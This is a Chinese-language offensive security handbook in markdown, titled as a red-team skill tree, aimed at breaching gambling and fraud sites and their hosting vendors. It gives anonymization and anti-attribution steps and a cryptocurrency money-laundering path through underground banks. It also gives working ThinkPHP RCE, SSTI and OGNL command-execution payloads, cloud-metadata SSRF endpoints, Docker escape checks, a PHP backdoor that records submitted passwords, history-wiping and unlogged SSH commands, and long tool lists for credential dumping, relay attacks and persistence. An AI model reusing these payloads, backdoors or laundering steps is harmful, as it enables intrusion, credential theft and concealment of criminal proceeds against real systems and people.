<!-- redteam-reference v2 -->
# 蓝军技能树 - 炼化Skill (2026.04 重铸版)

> 红蓝对抗实战参考知识库。覆盖反溯源、信息收集、渗透实战、代码审计、后渗透横向、钓鱼、远控免杀、云原生攻防、供应链攻击、AI赋能攻击等全栈攻防场景。
> 基于「蓝军技能树.xmind」完整导图炼化，补充2025-2026最新APT攻防技术。

---

## 1. 反溯源与匿名化

### 1.1 工作环境配置

**主机硬盘加密**: VeraCrypt (https://www.veracrypt.fr)

**虚拟机安全配置**:
- 删除蓝牙、NAT网卡；使用 Shadow Defender
- 共享文件夹挂载放置文件
- 渗透机与报告机分离；WPS禁止同步文档
- 密码管理: Mybase + KeePass

**个人信息清理**:
- 禁用个人ID/历史密码/历史账号，账号一次一弃
- 匿名邮箱: ProtonMail / Outlook
- 接码平台: sms-activate.io
- 设备购买(二手): 注意设备ID、WiFi BSSID (`netsh wlan show networks mode=bssid`)
- 手机卡: 线下购买/副卡；TG购买不绑自己手机号
- 虚拟币洗钱路径: 冷钱包/现金(境内地下钱庄交易) → U → 多币种混币 → U (匿名洗钱损耗7%-10%，经洗钱公司/地下钱庄加佣金总损耗~30%)

**反溯源分析要素**: 对手是谁(BC包网等) → 做了哪些链路 → 每跳泄露什么信息 → 谁能获取 → 时间成本 → 所需权限

### 1.2 匿名网络链路

**主机选购**: 非大陆地区(shockhosting/psychz.net/亚马逊云/CF/jtti.cc)，优先选择支持USDT，不同主机商分散，避免香港阿里云

**链路搭建**:
- `境外流量卡 → frp → SoftEther VPN → LunaProxy(动态住宅代理)` ([SoftEtherVPN](https://github.com/SoftEtherVPN/SoftEtherVPN_Stable))
- `境外流量卡 → LunaProxy → 流量代理` ([suying999.net](https://suying999.net))
- `境内流量卡 → SoftEther VPN → 流量代理`
- 匿名流量设备
- VPN配置及痕迹清理

### 1.3 渗透环境及工具配置

**创建账号**: GitHub / SecurityTrails(全球最大情报商) / Censys(每天更新+rustscan) / FOFA-Hunter(禁止实战虚拟机内登录)

**工具**: ffuf / [网盘打包](https://pan.baidu.com/s/1AL9YxaSvh0TpfBtnWe_LCw?pwd=431d)

**字典**: [9bie/dict](https://github.com/9bie/dict) / [SecDictionary](https://github.com/SexyBeast233/SecDictionary) / [MyDict](https://github.com/r00tSe7en/MyDict)

**参考**: [lcx.cc反溯源](https://lcx.cc/post/3213/)

### 1.4 包网业务理解

**金主模式**: 金主→提供建站服务/开发 → 代码+搭建 / 代码+搭建+运维 / 自建站
**BC→页面关联**: 一大批站点关联
**包网→目标决策**: 打下包网 → 控制所有数据 / 维权 / 供应链(客户账密支付) / 获取源码 / 控运维修开发最差控客服

### 1.5 反间防谍

**商业间谍**: 如何买通内鬼 / 商业咨询公司套路 / 如何查处内鬼 / 数据上下游分析溯源

**地缘对抗**: 不同政体间谍对抗

---

## 2. 信息收集

### 2.1 SGK数据来源

通信工具: BreachForums / Potato / 蝙蝠/海鸥/事密达 / TG(买临时账号刷社工库次数) / Signal / Discord / WhatsApp / Jabber / Session / Matrix / SimpleX

### 2.2 拿到站看什么

- paramspider做字典
- 站点技术栈识别
- URL结构分析

### 2.3 开源信息收集(OSINT)

**GitHub关键字搜索**:
| 关键字 | 用途 |
|--------|------|
| ldap | 结合域名→内网资产信息 |
| login | 登录接口发现 |
| 小业务项目名 | 弱口令/硬编码 |
| 项目关联→账号下信息 | 人物溯源 |
| 拼音(缩写) | 中文开发者关联 |
| 子域名/内网域名 | 资产扩展 |
| com.xxx | 企业域名关联 |
| 中文 | 国内项目搜索 |
| js/css/html/特殊文件名 | 页面特征匹配 |

**GitHub人物关联**: star / fork / commit / follow

**资产平台**:
| 平台 | 特点 |
|------|------|
| SecurityTrails | 子域名、全球情报 |
| Censys | 每天扫端口，时效性强(可能遗漏不全)，配合rustscan |
| FOFA / Hunter | ico/title/body搜索；禁止实战虚拟机内登录 |
| Rapid7 DNS | 本地搭建ClickHouse查询 |
| ip138 IDC | IDC信息查询 |
| ASN | 自治系统号查询 |

**页面特征找源码**: JS/CSS/HTML特征 / 接口特征 / 联系方式

**其他渠道**: Gitee/看云/语雀/HackMD/石墨 (`site:yuque.com "xxx"`) / [Sigma.world](https://sigma.world/zh-hant/cis/floor-plan/)新闻 / Google语法(`site:xxx.com -www -fare -css -parking`) / DuckDuckGo / HackerOne / [Zeroday(hitcon.org)](https://zeroday.hitcon.org/) / Twitter/Facebook/LinkedIn(员工→初始密码规则) / 网盘(第三方) / Medium

**Bypass CDN**: 页面特征→真实IP / 历史解析→真实IP / 其他业务关联IP段→真实IP

### 2.4 供应链信息收集

供应商大会(海外企业) / 招投标 / 页面特征(js/css/html) / 接口特征 / 联系方式找源码

### 2.5 建站公司实战溯源

**BC包网溯源**: 同CDN / 同DNS / 同机房 / 同页面特征找测试站域名IP关联包网 / 同关键字特征域名模糊搜索 / 找客服对模版

**团伙人员信息溯源**: 历史发帖关联账号 / 特殊ID / SGK / 文件元数据 / 钓鱼

---

## 3. 渗透实战

### 3.1 黑盒快速打点思路

**目标决策链**: 目标是什么 → 打下包网(控制数据/维权/供应链/客户账密支付/控制台权限/获取源码/控运维修开发/控客服) → 是否往下控客户(f2a验证/ip白名单/登录ip/cookie/storage)

#### BC站点攻击面

| 目标 | 攻击手法 |
|------|---------|
| **活动站** | SQL注入(sqlmap改造指定库表去掉探测) / 备份文件 / 框架漏洞(RCE/反序列化/上传/任意文件读写) / 临时搭建(翻文件横向→MQ→钓鱼) / 收集域名资产扩展(多个包网分站公用活动站/包网相关域名) |
| **客服站** | XSS→钓鱼/electron RCE / 购入源码自行搭建→markdown标签 / 通过客服系统供应商获取测试站源码 / 找后台/扫目录 / 通过客服站资产归因包网资产(94chat) / 从客服获取信息获取站点更多信息 |
| **页面关联** | JS / JS Console / 静态资源加载 / WSS （不太可靠） |
| **包网运维** | Jenkins / 各类国产OA管理软件 / MQ / 测试站弱口令→GETShell→横向/挂马钓鱼/拿源码/报错调试 / 收集后台接口(../../../) / 源码转售渠道(简单沟通/扫备份/黑盒/根据后台页面加载资源找更多页面特征→money.php/后台调试报错→特殊数据库表名文件名) |
| **历史边缘资产** | 包网很难找 / bbscan找备份快速代码审计(备份只适用于本站→后台api后端文件名) |
| **越权** | 垂直越权→更多接口权限 / 水平越权→全站 / 后台多个管理账号情况下有意义 |
| **四方支付/外接台子** | Login Proxy(用户名变化/加载资产变换/新域名特征无法关联回源站) / 找框架/资产/漏洞 |

**大型BC特点**: 买BC牌照→正式化/公司化/规模化→Azure/云应用(难度大/时间成本高/长期坐牢打击积极性)

**BC业务演进**: 卖源码(老旧前端/后台代码被改/uniapp前端→雇私人开发) / 信用盘娱乐城(主要目标) / QB(试用期6个月→打穿长期驻留) / 区块链(web3/杀猪盘/btc赌局) / TG Bot / 微盘(精聊)

**分工模式**: 信息收集+黑盒+白盒+内网 → 攻击对(分工明确/企业雇员) vs 独立完成目标从头到尾 → 工具(burp/yakit/cpacha_killer_modify/burp TLS改指纹)

**扫描器开发**: 尽量不带攻击特征 / 发包内容无害化 / POC验证

#### CP站点攻击面

| 攻击点 | 手法 |
|--------|------|
| 注入 | 投注环节SQL注入(接外部彩票接口/前后端加密) / 签到注入 / 轮盘活动 / `orderby=rand(1=1)` |
| 客服站 | 邀请码 / 53 / meiqia |
| 导航站 | 找关联资产 |
| 聊天室 | XSS → WebSocket利用 → 找包网 |
| 图片站 | 找包网 / img.xxx.com → 管理系统 |
| 编辑器 | 任意文件上传 / XSS / UEditor(PHP→SSRF→内网存活端口/真实IP→DNS) / UEditor(.NET→上传) |
| 报错信息 | JSON闭合 / 变量名数组(`word[]=xxx` → Java/PHP/中间件→CF) |
| 多端口 | 高端口开其他服务(真实IP/绑定不同域名) / nginx反带(80-30000+) |
| 反序列化 | CI框架 ([CI反序列化参考](https://guokeya.github.io/post/lQXYmp8_4/)) / `gzip test.phar` |
| 国内主流域名 | 常见SRC / BC站ZP站(通过特征批量收集) / 爬虫做字典 |
| 演示站 | 打源码 |
| 数据脱取 | adminer / 拖到服务器分片传输(web目录/GitHub LFS/Action) |

#### ZP站点攻击面

| 攻击点 | 手法 |
|--------|------|
| 本站快速打点 | 目录/端口/弱口令 / bbscan找备份快速代码审计 / 头像上传 / 语音朋友圈上传→钓鱼(SH) / 裸聊同城→做任务刷单 |
| PHP | 变量覆盖 |
| 路由 | filter/WAF → 提出来扫一遍 |
| 漏洞点 | 配置文件(硬编码→Cookie伪造) / 危险函数(debug→黑百合) / 怎么触发需什么条件(路由/权限) |
| 临时买服务器 | RAM必须绑MFA ([auth.ping8.top](https://auth.ping8.top/) → 导出用户名:secret) |

### 3.2 常见漏洞原理及利用工具与思路

**漏洞利用方法论**:
```
组件→源码(开源/备份/从客服获取信息/网盘泄露/多版本测试/商业版破解)→版本(更新时间/修复日志→绕过/影响范围/商业版差异)
→POC获取(GitHub/博客/源码分析/工具抓包)→原理(漏洞点/利用条件/后果/请求路由→二次开发)
→实战化改造(本地搭建/不出网/.NET Core内存马)
```

**常用漏洞分类**:

#### SQL注入
- 不依赖sqlmap，自写脚本
- 判断: 站库分离? / 写权限? / 命令执行?(Oracle 19c sys)
- 不可破解→写入后台账密/配置参数/改写密钥(Bcrypt/文件类型)
- 工具: [ghauri](https://github.com/r0oth3x49/ghauri)

#### 任意文件读取
- 读敏感文件(.bash_history/.viminfo/源码/配置/日志/启动脚本)
- 列目录? / Windows跨盘符?
- `/proc/net/` / `/proc/self/` / `/proc/pid/`

#### 任意文件上传
- 目录返回? / 跨盘符? / 配合文件包含? / 上传OSS?

#### Docker逃逸
```bash
# 判断环境
.dockerenv | ls -alh /.dockerenv | cat /proc/1/cgroup | mount | grep docker | fdisk -l | ps -aux
# 特权模式检查
cat /proc/self/status | grep Cap  # 0000003fffffffff → 挂载宿主机
# Registry API未授权
https://github.com/Soufaker/docker_v2_catalog
# Remote API(2375)
docker -H tcp://<target>:2375 ps -a
# 工具
https://github.com/teamssix/container-escape-check
https://github.com/cdk-team/CDK
```

#### SSRF云元数据
- 阿里云: `http://100.100.100.200/latest/meta-data` / `/ram/security-credentials/`
- 腾讯云: `http://metadata.tencentyun.com/latest/meta-data/`
- 华为云: [ECS用户手册](https://doc.hcs.huawei.com/zh-cn/usermanual/ecs/ECS_ug_000081.html)
- OSS Browser / CF

#### PHP配置文件写入
- `'); phpinfo(); /*`
- 变量覆盖

#### 单一登录口的攻击面挖掘（面试发散思维）
- IP / 域名 / 谷歌搜索提及网站的历史文章(wayurl) / JS\目录\接口\参数爆破(arjun/hae)
- 注入(.NET) / 注册 / GitHub找登录脚本 / 爆破JWT / help文档 / [swagger-exp-knife4j](https://github.com/cws001/swagger-exp-knife4j)

#### ThinkPHP漏洞速查
| 版本 | 漏洞 | 关键点 |
|------|------|--------|
| 5.0.0-5.0.23 | RCE(变量覆盖+代码执行) | trace+强制路由: `_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id` / debug+路由: `_method=__construct&filter[]=system&get[]=id` |
| 5.0.0-5.0.23 | 任意类调用(反射) | `s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id` |
| 6.0.1-6.0.13 | 多语言RCE(pearcmd) | `lang=../../../../../../usr/local/lib/php/pearcmd` → 文件包含 |
| 3.2.* / 5.0.0-5.0.18 | 模板变量覆盖+文件包含 | View::assign()配合图片马/日志 |
| 5.x | Windows析构函数任意文件删除 | `think\process\pipes\Windows::__destruct` |
- 工具: [thinkphp_gui_tools](https://github.com/bewhale/thinkphp_gui_tools)
- TP3/5区别: TP3目录大写开头 vs TP5/6小写；日志存放位置不同
- SQL注入: count/max未过滤→parseKey / _parseOptions直接拼接 / parseWhereItem(bind/between/eq) / parseData未过滤

#### SSH后门
- tsh: 内网机器→外网连接，VPS不能断
- PAM后门: 测试好版本，保持连接
- [sshdHooker](https://github.com/9bie/sshdHooker)

#### 文件搜索
- [FindEverything](https://github.com/AabyssZG/FindEverything) → 扩写自己喜欢的版本

#### 痕迹清除
- [ShadowlessFeet](https://github.com/r00tSe7en/ShadowlessFeet)
- `unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0`
- 修改文件时间
- **内网探测逻辑**: 内网严禁扫描 / 按照机器逻辑访问内网 / 根据内网连接探测内网
- **脚本作业**: 单线程 / 扫单个端口 / IP地址随机 / 扫描后有随机时延

---

## 4. 代码审计

### 4.1 Java代码审计

#### SQL注入(MyBatis)
- `order by ${time}` / `LIKE '%${stuName}%'` / `in (${id})` / 直接调用语句
- OGNL注入: `${@java.lang.Runtime@getRuntime().exec("whoami")}` → OgnlCache.getValue → parseExpression
- 参考: [OGNL Language Guide](https://commons.apache.org/dormant/commons-ognl/language-guide.html) / [泛微e-mobile OGNL注入](https://github.com/Mr-xn/Penetration_Testing_POC/blob/master/%E6%B3%9B%E5%BE%AEe-mobile%20ognl%E6%B3%A8%E5%85%A5.md)

#### 反序列化
- fastjson(确定有CC链) / shiro / log4j / JasperReports
- **核心**: 根据依赖版本确定链子 → 知道原理 + 有POC + 能改POC(链子)

#### SSTI(Thymeleaf)
- SPEL表达式执行
- 前提: 表达式无过滤 + getValue/setValue + StandardEvaluationContext(默认)
- Payload: `__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("calc.exe").getInputStream()).next()%7d__::.x`

#### 组件弱口令/未授权
- Druid(未授权+RCE) / swagger-ui / xxl-job

#### 过滤器缺陷
- 目录穿越→越权 / XSS / 黑白盒结合跑未授权接口(简单分析状态码)

#### 登录绕过
- 路径穿越: `GET /api/admin/login/../../../api/userBill/export`
- Secret硬编码: 查看token/cookie生成方法→伪造
- 伪随机(种子相同→预测): [JumpServer漏洞分析](https://www.leavesongs.com/PENETRATION/jumpserver-sep-2023-multiple-vulnerabilities-go-through.html) → django-simple-captcha seed问题

#### 未授权/可控权限接口
- 上传 / 注入([MyBatis注入参考](https://www.yangdx.com/2022/05/211.html)) / XXE(RCE? → file/ftp/mailto/http/https/jar/netdoc) / 文件操作 / SSRF

#### 粗糙WAF绕过
- 通常在filter → 规则不严绕WAF / 找不在filter规则内的接口

### 4.2 Java反序列化基础

**ClassLoader体系**: BootStrap(rt.jar→java.lang/java.io) → ExtClassLoader(PlatformClassLoader) → AppClassLoader(URLClassLoader)
- 双亲委派: loadClass / findClass / findLoadedClass / defineClass(传入字节码→JVM加载) / resolveClass
- 打破双亲委派: 自定义ClassLoader重写loadClass方法
- BCEL ClassLoader: `com.sun.org.apache.bcel`(JDK<8u251 rt.jar) → `$$BCEL$$`编码→decode→Parser→defineClass加载
  - Tomcat7: `org.apache.tomcat.dbcp.dbcp.BasicDataSource`
  - Tomcat8+: `org.apache.tomcat.dbcp.dbcp2.BasicDataSource`

**命令执行链**: TransformerChain → newTransformer/getOutputProperties → defineTransletClasses → _bytecodes字段bytecode → defineClass → newInstance → static块/无参构造

**序列化特征**: `0xACED005`

### 4.3 PHP代码审计

**TP架构**: runtime(网页缓存Cache::set/session/log→session id) / application(项目源码) / thinkphp(框架源码) / vendor(composer扩展) / extend(手动第三方库)

**TP路由模式**:
- TP3: `URL_MODEL`(0普通/1PATHINFO/2REWRITE/3兼容)
- TP6: 基于pathinfo和兼容模式，Route::get/rule/xxx配置

**注入点详表**:
| 方法 | 版本 | 漏洞 |
|------|------|------|
| parseKey(count/max) | 5.0.0/5.0.23/TP3 | 未过滤 |
| _parseOptions(PDO) | TP3 | 直接拼接 |
| parseWhereItem(bind) | TP≤3.2.4 | 直接拼接 |
| parseWhereItem(between) | TP 3.1.*-3.2.0 | 直接拼接 |
| parseWhereItem(eq/neq/gt) | TP 3.2.* | 直接拼接 |
| parseData(parseKey) | 5.0.13-5.0.15(inc/dec), 5.1.0-5.1.5(exp/inc/dec) | 未过滤 |
| 投注/签到/大转盘 | - | 业务场景注入点 |

**RCE完整链**:
- Request::__construct变量覆盖+Request::input代码执行(TP 5.0.0-5.0.23)
  - trace+强制路由 / debug+url_route_on / $dispatch['method']
- $dispatch['module']反射调用任意类(TP 5.0.0-5.0.23, 5.1.0-5.1.30)
- Windows::__destruct任意文件删除
- LoadLangPack多语言RCE(TP 6.0.1-6.0.13) → pearcmd文件包含
- View::assign()模板变量覆盖+文件包含(TP 3.2.*, 5.0.0-5.0.18, 5.1.0-5.1.10)

**鉴权机制**: Route动态参数 / 鉴权中间件(路由白名单) / beforeAction/afterAction / 验证码 / auth类/RBAC第三方库

**文件操作**: file_get_contents(任意文件读/SSRF) / curl / php://input(/etc/passwd) / extends鉴权类(没有→未授权但需路由可访达) / is_dir/unlink(phar反序列化→CI4 / unlink删除lock文件鸡肋)

**文件上传**: 临时文件(条件竞争) / 后缀名判定 / phpinfo写文件

**XSS**: htmlspecialchars默认不转义单引号 / 多次编码转换 / XSS打后台(银行卡/xss接收平台)

### 4.4 .NET站点代码审计

- 参考: [.NET内存马](https://mp.weixin.qq.com/s/6v_JVnFsgIGGmC_wa3UZwQ)

### 4.5 Java内存马

- 加载过程: Tomcat架构 / 加载安全机制
- 广泛性 / 反射和shell的区别

### 4.6 商业加密PHP代码/IoT设备PHP管理页面

- Hook PHP DLL函数dump明文
- 内存dump明文

### 4.7 Java反编译工具

| 工具 | 地址 |
|------|------|
| javadecompilers.com | http://www.javadecompilers.com/ |
| decompiler.com | http://www.decompiler.com/ |
| devtoolzone | https://devtoolzone.com/decompiler/java |
| jdec | https://jdec.herokuapp.com/ |
| mobilefish | https://www.mobilefish.com/services/java_decompiler/java_decompiler.php |
| javare.cn | http://javare.cn/ |

### 4.8 快速代码审计工具

- [CodeReviewTools](https://github.com/Ppsoft1991/CodeReviewTools) - 快速找关键字
- [code-inspector](https://github.com/4ra1n/code-inspector)
- [jar-analyzer](https://github.com/jar-analyzer/jar-analyzer)
- [RouteCheck-Alpha](https://github.com/ax1sX/RouteCheck-Alpha)
- [APT_REPORT](https://github.com/blackorbird/APT_REPORT) - APT报告收集
- [Doge-DNSptr](https://github.com/timwhitez/Doge-DNSptr)
- [knife](https://github.com/bit4woo/knife)

---

## 5. 后渗透与内网横向

### 5.1 域渗透提权

**凭证基础**: NTLM流程 → winlogon.exe接收密码 → lsass.exe比对SAM

**票据类型**: 黄金票据 / 白银票据 / 钻石票据 / 蓝宝石票据

**委派攻击**: 非约束委派 / 约束委派 / 基于资源的约束委派(RBCD)

**关键CVE速查**:
| CVE | 名称 | 核心原理 |
|-----|------|---------|
| MS14-068 | PAC伪造 | KDC对PAC签名算法无验证→伪造高权限PAC(512/520/518/519) → 利用前提: 域控未打KB3011780补丁 + 域内计算机 + 域用户密码和SID |
| CVE-2020-1472 | Zerologon | AES-CFB8加密全零明文→1/256概率全零密文→NetrServerPasswordSet2置空密码(516字节零→空密码) |
| CVE-2021-1675/34527 | PrintNightmare | RpcAddPrinterDriver无需SeLoadDriverPrivilege→SYSTEM RCE(Print Spooler服务) |
| CVE-2021-42287+42278 | noPac | 机器账户名不以$结尾→创建与DC同名账户→请求TGT→改名→S4U2Self→高权限ST。MS-DS-Machine-Account-Quota=0时需对账户有写权限(GenericAll/加域账号) |
| CVE-2022-26923 | ADCS | DNSHostname修改→证书欺骗 |

**通过WSUS/SCCM提权**:
- [WSUSpendu](https://github.com/AlsidOfficial/WSUSpendu) - 域内补丁更新服务器，原理类似EDR总控下发文件命令
- [sccmwtf](https://github.com/xpn/sccmwtf) - 推PowerShell

**通过AzureAD提权**: Azure AD Sync → 获取同步账户 → DC Sync

**打邮服**: 域管登录过 / 翻邮件 / WriteACL权限→给自己dsync权限([PrivExchange](https://github.com/dirkjanm/PrivExchange))

**堡垒机/运维机**: web后门偷密码

**web后门偷密码**:
```php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $data = $username . ':' . $password . PHP_EOL;
    file_put_contents('users.txt', $data, FILE_APPEND | LOCK_EX);
}
```

**抓取域管登陆服务器的hash** / **找密码本** / **找特权组用户**(Administrator/Backup Operators)

**NTLM中继工具**: Responder / Inveigh / multirelayx.py / PrinterBug / PetitPotam / DFSCoerce / ShadowCoerce / PrivExchange / [Coercer](https://github.com/p0dalirius/Coercer)

**通过Distributed-COM-Users/Performance-Log-Users权限获得域控权限**: [参考](https://decoder.cloud/2024/04/24/hello-im-your-domain-admin-and-i-want-to-authenticate-against-you/)

**分析组策略**: [gpoParser](https://github.com/synacktiv/gpoParser/tree/main)

**域内自动化**: [PIGADVulnScanner](https://github.com/evilashz/PIGADVulnScanner)

### 5.2 服务器提权

**Potato系列原理**:
- SeImpersonate: 身份验证后模拟客户端(Windows 2000 SP4 / SCM启动的服务 / COM基础设施 / 本地管理员 / 本地服务账户)
  - 查看位置: `gpedit → Computer Configuration\Windows Settings\Security Settings\Local Policies\User Rights Assignment`
  - 这是给线程的权限

- **COM基础**:
  - IUnknown接口: QueryInterface(dynamic_cast) / AddRef(引用计数) / Release
  - COM事件: event_source / event_receiver
  - BSTR: 分配时前面额外4字节长度字段
  - 内存: CoTaskMemAlloc / CoTaskMemFree
  - __uuidof / IID_PPV_ARGS / SafeRelease / CComPtr(不显式调用Release)

- **Rotten Potato**:
  - SSPI(Security Support Provider Interface): NTLM SSP(Challenge/Response) / Kerberos(ticket)
  - CoGetInstanceFromIStorage
  - 参考: [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) / [Foxglove Security](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)

**内核漏洞提权**

### 5.3 RPC域内信息收集与横向移动

#### 横向移动工具
| 工具 | 方法 |
|------|------|
| [wmiexec-Pro](https://github.com/XiaoliChan/wmiexec-Pro) | Win32_ScheduledJob |
| [NO445-lateral-movement](https://github.com/JDArmy/NO445-lateral-movement) | Win32_Process |
| [WMIHACKER](https://github.com/rootclay/WMIHACKER) | WMI命令执行 |
| [wmiexec-RegOut](https://github.com/XiaoliChan/wmiexec-RegOut) | 注册表回显 |
| [SCShell](https://github.com/Mr-Un1k0d3r/SCShell) | ChangeServiceConfigW |
| [WMIReg](https://github.com/airzero24/WMIReg) | StdRegProv |
| [rpc2socks](https://github.com/lexfo/rpc2socks) | SOCKS代理 |
| [ms_scmr](https://github.com/Marshall-Hallenbeck/ms_scmr) | 上传文件 |
| [smbtakeover](https://github.com/zyn3rgy/smbtakeover) | 解除445/tcp绑定 |
| [dcomhijack](https://github.com/WKL-Sec/dcomhijack) | DCOM相关DLL劫持 |
| [TaskSchedulerMisc](https://github.com/zcgonvh/TaskSchedulerMisc) | MS-TSCH计划任务 |

#### 信息收集
| 工具 | 方法 |
|------|------|
| [RPCSCAN](https://github.com/JDArmy/RPCSCAN) | ms-epmap |
| [EFSRPCrpc](https://github.com/StarfireLab/EFSRPCrpc) | EFSRPC-ping |

#### RPC工具
| 工具 | 用途 |
|------|------|
| [RPCForge](https://github.com/sogeti-esec-lab/RPCForge) | RPC Fuzz |
| [WinObjEx64](https://github.com/hfiref0x/WinObjEx64) | Windows对象查看器 |
| [serviceDetector](https://github.com/tothi/serviceDetector) | 连接445通过ms-lsat查询已安装服务 |
| [RPCMon](https://github.com/cyberark/RPCMon) | 监控RPC |
| [WFPExplorer](https://github.com/zodiacon/WFPExplorer) | Windows过滤平台对象 |
| [COMThanasia](https://github.com/CICADA8-Research/COMThanasia) | COM对象分析 |

### 5.4 域内凭证及口令收集

| 工具 | 功能 |
|------|------|
| [PassTheChallenge](https://github.com/ly4k/PassTheChallenge) | Credential Guard绕过 |
| [Pypykatz](https://github.com/ly4k/Pypykatz) | Python mimikatz |
| [ADFSRelay](https://github.com/praetorian-inc/ADFSRelay) | ADFS认证Relay |
| [NTLMRelay2Self](https://github.com/med0x2e/NTLMRelay2Self) | Web Relay |
| [Lsass-Shtinkering](https://github.com/deepinstinct/Lsass-Shtinkering) | Windows错误报告服务 |
| [rbcd-attack](https://github.com/tothi/rbcd-attack) | 资源约束委派 |
| [Darksteel](https://github.com/wjlab/Darksteel) | 域内自动化信息搜集 |
| [SharpUserIP](https://github.com/lele8/SharpUserIP) | 域控/远程提取登录日志→域用户IP |
| [ADExplorerX](https://github.com/aleenzz/ADExplorerX) | AD浏览器 |
| [Dumpert](https://github.com/outflanknl/Dumpert) | System Calls转储(旧) |
| [certsync](https://github.com/zblurx/certsync) | 证书利用 |
| [lsass-dump](https://github.com/battleoverflow/lsass-dump) | 导出简单演示 |
| [UserRegEnum_0x727](https://github.com/0x727/UserRegEnum_0x727) | 域内普通域用户权限查找所有计算机上登录用户 |
| [DumpHash](https://github.com/Avienma/DumpHash) | 干净hash导出(需高权限) |
| [Plog](https://github.com/GamehunterKaan/Plog) | mimikatz导出密码模块 |
| [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) | 只读DPAPI |
| [DragonCastle](https://github.com/mdsecactivebreach/DragonCastle) | DLL劫持读hash |
| [EZDump](https://github.com/expl0itabl3/EZDump) | 简单导出C# |
| [ETWHash](https://github.com/nettitude/ETWHash) | 利用ETW事件读hash |
| [ntlmthief](https://github.com/4ndr34z/ntlmthief) | 利用SSPI读hash |
| [PPLFault](https://github.com/gabriellandau/PPLFault) | 攻击PPL进程保护读hash |
| [ADCSKiller](https://github.com/grimlockx/ADCSKiller) | ADCS利用工具 |
| [RToolZ](https://github.com/OmriBaso/RToolZ) | ProcExp152.sys驱动转储PPL Lsass |
| [SharpToken](https://github.com/BeichenDream/SharpToken) | 找系统中所有进程泄露的Token |
| [RDPCredentialStealer](https://github.com/S12cybersecurity/RDPCredentialStealer) | Detours API Hook读RDP登录凭证 |
| [ListRDPConnections](https://github.com/Heart-Sky/ListRDPConnections) | 列出所有RDP连接记录 |
| [SharpDomainInfo](https://github.com/0neAtSec/SharpDomainInfo) | 自动化信息收集 |
| [spraycharles](https://github.com/Tw1sm/spraycharles) | 慢速密码喷射 |
| [GPOddity](https://github.com/synacktiv/GPOddity) | GPO利用 |
| [SharpExShell](https://github.com/grayhatkiller/SharpExShell) | - |
| [proc_noprocdump](https://github.com/djackreuter/proc_noprocdump) | - |
| [adeleg](https://github.com/mtth-bfft/adeleg) | 查所有委派 |
| [NativeDump](https://github.com/ricardojoserf/NativeDump) | - |
| [LeakedWallpaper](https://github.com/MzHmO/LeakedWallpaper) | 从session提取hash |
| [LsassReflectDumping](https://github.com/Offensive-Panda/LsassReflectDumping) | - |
| [ShadowDumper](https://github.com/Offensive-Panda/ShadowDumper) | 多种方式导出hash |

### 5.5 权限维持

#### Windows后门
- 自启动后门
- [WMIPersistence](https://github.com/mdsecactivebreach/WMIPersistence)
- [GhostTask](https://github.com/netero1010/GhostTask)

#### Linux后门
- PAM后门
- tsh后门

#### 修改源码插入后门

### 5.6 内网核心设备攻防

#### NAS攻击
- 弱口令(Web管理界面) / 未授权访问 / 已知CVE(NAS厂商特定)
- 共享文件(SMB/NFS) → 敏感文档(合同/密码本/架构图)
- 同步服务漏洞 → RCE → 横向到其他内网资产

#### 邮服攻击
- Exchange: ProxyLogon/ProxyShell/ProxyNotShell系列 / 规则后门
- Coremail: 历史漏洞利用 / 管理后台弱口令
- 翻邮件找: 域管凭证 / VPN账密 / 内部系统地址 / 机密附件
- 配合Outlook规则持久化 / 邮件转发规则窃密

#### 堡垒机攻击
- JumpServer历史CVE / 管理后台弱口令 / Session录像泄露凭证
- 通过堡垒机跳板到所有纳管资产(全链路横向)

#### vCenter攻击
- CVE-2021-21972(vSphere Client RCE) / CVE-2021-21985 / CVE-2021-22005
- SAML Token伪造(黄金票据变体) → 控制所有VM
- 通过vCenter获取所有虚拟机快照/内存dump→提取凭证
- 工具: [vCenter-Attack](https://github.com/SGGS-POC/vCenter-Attack)

#### VDI云桌面攻击
- Citrix/VMware Horizon/RDP网关漏洞
- Cookie泄露→无需认证直接连接桌面
- 影子文件窃取(BrowserPivot)
- 登录凭证抓取(RDPCredentialStealer)

#### VPN设备攻击
- Fortinet: CVE-2022-42475 / CVE-2023-27997 / CVE-2024-21762 → SSL VPN RCE
- Palo Alto: CVE-2024-3400 → GlobalProtect RCE(无需认证)
- Ivanti: CVE-2023-46805+CVE-2024-21887 → 认证绕过+RCE
- VPN cookie窃取/重放 → 直接接入内网
- 持久化: 植入后门到VPN设备固件→长期中间人

### 5.7 非域内网渗透

#### 入口方式
| 入口 | 方法 |
|------|------|
| Web打点(Linux getshell) | 重新爬取web源码→敏感信息(secretkey/硬编码/URL) / 拖回审代码→更多漏洞维持权限 / 找web可访达目录→放马 |
| VPN | 漏洞获取shell / 漏洞泄露用户名密码(fortinet) / 漏洞泄露cookie(云桌面→勒索) / 流量清晰可见→快速找跳板机 |
| SSO | DNS劫持绕过二次验证 / 注意设备登录提醒 / OAuth漏洞 |
| 单挂Windows | 注册表信息收集 / 找敏感文件 / RDP劫持 |

#### Linux getshell后操作
- 找本机关键信息: hosts / history / .viminfo / SSH私钥
- PAM抓SSH密码(SO文件本地搭环境自己编译)
- 扫内存: [dismember](https://github.com/liamg/dismember)
- [Platypus](https://platypus-reverse-shell.vercel.app)
- 找目录: `find / -writable -type d 2>/dev/null` / `find / -perm -222 -type d` / `find / \( -perm -o w -perm -o x \) -type d`
- 查iptables
- 幽灵登录: `ssh -T root@192.168.1.1 /usr/bin/bash -i` (不分配伪终端无日志有连接)
- 搜索特定字符串: `grep -rn "jdbc:oracle" /opt/`

#### Windows信息收集
- 注册表: [Nemesis](https://github.com/SpecterOps/Nemesis)
- 敏感文件: [FileSearch](https://github.com/c1y2m3/FileSearch) / [searchall](https://github.com/Naturehi666/searchall) / [msi-search](https://github.com/mandiant/msi-search) / [FindEverything](https://github.com/AabyssZG/FindEverything)
- 指定磁盘搜索: `dir D:\ /S /B | find "orange1.jsp"`
